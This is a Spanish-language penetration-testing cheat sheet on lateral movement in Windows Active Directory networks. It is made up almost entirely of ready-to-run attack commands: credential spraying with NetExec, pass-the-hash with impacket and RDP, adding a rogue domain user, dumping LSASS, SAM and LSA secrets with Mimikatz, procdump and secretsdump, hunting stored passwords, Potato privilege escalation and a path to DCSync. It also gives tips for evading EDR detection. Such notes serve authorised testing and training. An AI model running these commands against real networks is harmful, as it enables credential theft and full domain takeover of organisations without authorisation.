---
icon: windows
---

# Movimiento Lateral

El movimiento lateral consiste en usar las credenciales/tickets obtenidos para desplazarse por la red hacia sistemas de mayor valor: otros equipos, servidores críticos, y finalmente el Domain Controller.

### Requisito previo: verificar acceso

Antes de intentar moverse, confirmar qué credenciales funcionan y en qué equipos:

```bash
# NetExec — verificar credenciales en toda la red
nxc smb 10.10.10.0/24 -u usuario -p contraseña
nxc smb 10.10.10.0/24 -u Administrator -H NTHASH --local-auth  # Admin local

# Resultado: [+] = acceso, Pwn3d! = admin local en ese equipo
# 10.10.10.15  [+] empresa\usuario:contraseña (Pwn3d!)

# Verificar WinRM (PowerShell remoto)
nxc winrm 10.10.10.0/24 -u usuario -p contraseña

# Verificar RDP
nxc rdp 10.10.10.0/24 -u usuario -p contraseña
```

### 1. SMB - PsExec / SmbExec / WmiExec

Requiere que el usuario sea admin local en el objetivo.

```bash
# impacket-psexec — crea servicio temporal, da SYSTEM
impacket-psexec empresa.local/usuario:contraseña@10.10.10.15
impacket-psexec empresa.local/Administrator@10.10.10.15 -hashes :NTHASH

# impacket-smbexec — más sigiloso que psexec (no crea binario en disco)
impacket-smbexec empresa.local/usuario:contraseña@10.10.10.15
impacket-smbexec empresa.local/Administrator@10.10.10.15 -hashes :NTHASH

# impacket-wmiexec — usa WMI, no deja servicio (más sigiloso)
impacket-wmiexec empresa.local/usuario:contraseña@10.10.10.15
impacket-wmiexec empresa.local/Administrator@10.10.10.15 -hashes :NTHASH

# Ejecutar comando específico
impacket-wmiexec empresa.local/usuario:contraseña@10.10.10.15 "whoami"
impacket-wmiexec empresa.local/usuario:contraseña@10.10.10.15 "net user hacker Hacked123! /add /domain"

# NetExec — ejecutar comandos en masa
nxc smb 10.10.10.0/24 -u usuario -p contraseña -x "whoami"
nxc smb 10.10.10.0/24 -u usuario -p contraseña --exec-method wmiexec -x "ipconfig"
```

### 2. WinRM - PowerShell Remoto

WinRM (puerto 5985/5986) permite ejecución remota de PowerShell. Requiere que el usuario sea miembro de Remote Management Users o admin local.

```bash
# Evil-WinRM (herramienta principal para WinRM)
evil-winrm -i 10.10.10.15 -u usuario -p contraseña
evil-winrm -i 10.10.10.15 -u Administrator -H NTHASH

# Con ticket Kerberos
evil-winrm -i dc01.empresa.local -r empresa.local   # usa KRB5CCNAME del entorno

# Evil-WinRM — cargar scripts PowerShell automáticamente
evil-winrm -i 10.10.10.15 -u usuario -p contraseña -s /ruta/scripts/

# Desde Windows — Enter-PSSession nativo
$cred = Get-Credential
Enter-PSSession -ComputerName 10.10.10.15 -Credential $cred

# Ejecutar comando remoto sin sesión interactiva
Invoke-Command -ComputerName 10.10.10.15 -Credential $cred -ScriptBlock { whoami }
Invoke-Command -ComputerName 10.10.10.15 -Credential $cred -ScriptBlock { Get-Process }

# NetExec — WinRM
nxc winrm 10.10.10.15 -u usuario -p contraseña -x "whoami"
```

### 3. RDP

```bash
# Verificar acceso RDP
nxc rdp 10.10.10.0/24 -u usuario -p contraseña

# xfreerdp (Linux)
xfreerdp /u:usuario /p:contraseña /v:10.10.10.15
xfreerdp /u:Administrator /pth:NTHASH /v:10.10.10.15   # Pass-the-Hash (RestrictedAdmin mode)
xfreerdp /u:usuario /p:contraseña /v:10.10.10.15 /cert-ignore /dynamic-resolution

# Habilitar RestrictedAdmin mode (para PtH con RDP)
# En el equipo objetivo:
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# rdesktop (alternativa)
rdesktop -u usuario -p contraseña 10.10.10.15
```

### 4. Dump de credenciales en el equipo comprometido

Una vez dentro de un equipo, extraer credenciales para continuar moviéndose.

#### Mimikatz

```powershell
# Cargar mimikatz
.\mimikatz.exe

# Requerir privilegios de debug
privilege::debug

# Hashes y credenciales en claro desde LSASS
sekurlsa::logonpasswords

# Solo hashes NTLM
sekurlsa::msv

# Tickets Kerberos en memoria
sekurlsa::tickets /export

# Hashes del SAM local
lsadump::sam

# Secretos LSA (contraseñas de servicios, cuentas de máquina)
lsadump::secrets

# Credenciales cacheadas (domain cached credentials)
lsadump::cache
```

#### Mimikatz - dump sin ejecutar el binario

```powershell
# Volcar LSASS con Task Manager (GUI) o con:
# PowerShell con rundll32
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id lsass.dmp full

# Procdump (Sysinternals — firmado, menos detecciones)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Luego procesar el dump desde Linux
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
pypykatz lsa minidump lsass.dmp
```

#### Impacket desde Linux (sin ejecutar nada en el objetivo)

```bash
# Secretsdump remoto (requiere admin)
impacket-secretsdump empresa.local/usuario:contraseña@10.10.10.15

# Con hash
impacket-secretsdump empresa.local/Administrator@10.10.10.15 -hashes :NTHASH

# Output incluye:
# [*] SAM hashes
# [*] LSA secrets
# [*] Cached domain logon information
# [*] NTDS.dit (si es un DC)

# NetExec dump de SAM
nxc smb 10.10.10.15 -u usuario -p contraseña --sam
nxc smb 10.10.10.15 -u usuario -p contraseña --lsa
nxc smb 10.10.10.15 -u usuario -p contraseña -M lsassy   # Dump de LSASS
```

### 5. Movimiento lateral con Kerberos (sin NTLM)

En entornos donde NTLM está bloqueado o se quiere usar Kerberos para mayor sigilo:

```bash
# Obtener TGT con credenciales
impacket-getTGT empresa.local/usuario:contraseña -dc-ip 10.10.10.10
export KRB5CCNAME=usuario.ccache

# Usar el TGT con herramientas impacket (flag -k)
impacket-psexec -k -no-pass empresa.local/usuario@target.empresa.local
impacket-wmiexec -k -no-pass empresa.local/usuario@target.empresa.local
impacket-smbclient -k -no-pass empresa.local/usuario@target.empresa.local
impacket-secretsdump -k -no-pass empresa.local/usuario@dc01.empresa.local

# Evil-WinRM con Kerberos
evil-winrm -i dc01.empresa.local -r EMPRESA.LOCAL
```

### 6. Búsqueda de credenciales almacenadas

```powershell
# Buscar contraseñas en archivos del sistema
findstr /s /i "password" C:\*.txt C:\*.xml C:\*.ini C:\*.config
findstr /s /i "password" C:\Users\*\*.txt
Get-ChildItem -Recurse -Filter "*.xml" | Select-String -Pattern "password" -CaseSensitive:$false

# Credenciales del Administrador local almacenadas en credmanager
cmdkey /list
# Si hay credenciales:
runas /savedcred /user:empresa.local\Administrator cmd.exe

# Historial de PowerShell
type C:\Users\usuario\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Variables de entorno
Get-ChildItem Env: | Where-Object { $_.Name -match "pass|pwd|cred|key|token|secret" }

# Ficheros de configuración comunes
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\Program Files\*\*.config
```

### 7. Token Impersonation

Si se tienen privilegios de SeImpersonatePrivilege (común en cuentas de servicio de IIS, SQL Server, etc.):

```powershell
# Potato attacks — escalar de servicio a SYSTEM
# PrintSpoofer (Windows 10/Server 2019+)
.\PrintSpoofer.exe -i -c cmd.exe

# GodPotato (más moderno, compatible con múltiples versiones)
.\GodPotato.exe -cmd "cmd.exe /c whoami"

# SweetPotato
.\SweetPotato.exe -p cmd.exe -a "/c whoami"

# JuicyPotato (Windows <= Server 2016)
.\JuicyPotato.exe -t * -p cmd.exe -l 9999 -c "{CLSID}"

# Incognito — listar y usar tokens disponibles (Metasploit)
use incognito
list_tokens -u
impersonate_token "EMPRESA\\Administrator"
```

### Flujo de movimiento lateral

```
1. Comprometer equipo inicial (foothold)
   → Credenciales de un usuario de dominio

2. Enumerar con las credenciales
   → BloodHound: ¿qué equipos son accesibles? ¿dónde está logueado un admin?

3. Moverse al siguiente equipo
   → PsExec / WinRM / RDP con credenciales/hash

4. Dump de credenciales en el nuevo equipo
   → Secretsdump / Mimikatz / LSASS dump

5. ¿Hay admin de dominio logueado?
   → Sí → dump su hash/ticket → comprometer el DC
   → No → repetir desde el paso 2 con las nuevas credenciales

6. Comprometer el DC
   → DCSync → todos los hashes del dominio
```

> Buscar dónde está logueado un Domain Admin con BloodHound o `Find-DomainUserLocation` es la forma más directa de encontrar el path al DC.

> `Pwn3d!` en NetExec significa que el usuario tiene derechos de admin local en ese equipo → se puede ejecutar secretsdump remotamente sin siquiera conectarse.

> WMI (wmiexec) es generalmente más sigiloso que PsExec porque no crea un servicio en el sistema objetivo. Preferirlo en entornos con EDR activo.
